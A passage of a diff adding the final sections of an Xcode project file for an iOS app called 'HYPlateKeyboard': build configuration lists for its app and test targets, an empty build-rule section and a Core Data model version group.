+		4275371A25E622E60012B2D9 /* Build configuration list for PBXProject "HYPlateKeyboard" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				4275374F25E622ED0012B2D9 /* Debug */,
+				4275375025E622ED0012B2D9 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		4275375125E622ED0012B2D9 /* Build configuration list for PBXNativeTarget "HYPlateKeyboard" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				4275375225E622ED0012B2D9 /* Debug */,
+				4275375325E622ED0012B2D9 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		4275375425E622ED0012B2D9 /* Build configuration list for PBXNativeTarget "HYPlateKeyboardTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				4275375525E622ED0012B2D9 /* Debug */,
+				4275375625E622ED0012B2D9 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		4275375725E622ED0012B2D9 /* Build configuration list for PBXNativeTarget "HYPlateKeyboardUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				4275375825E622ED0012B2D9 /* Debug */,
+				4275375925E622ED0012B2D9 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
+
+/* Begin XCVersionGroup section */
+		4275372E25E622E60012B2D9 /* HYPlateKeyboard.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				4275372F25E622E60012B2D9 /* HYPlateKeyboard.xcdatamodel */,
+			);
+			currentVersion = 4275372F25E622E60012B2D9 /* HYPlateKeyboard.xcdatamodel */;
+			path = HYPlateKeyboard.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+/* End XCVersionGroup section */
+	};
+	rootObject = 4275371725E622E60012B2D9 /* Project object */;
+}
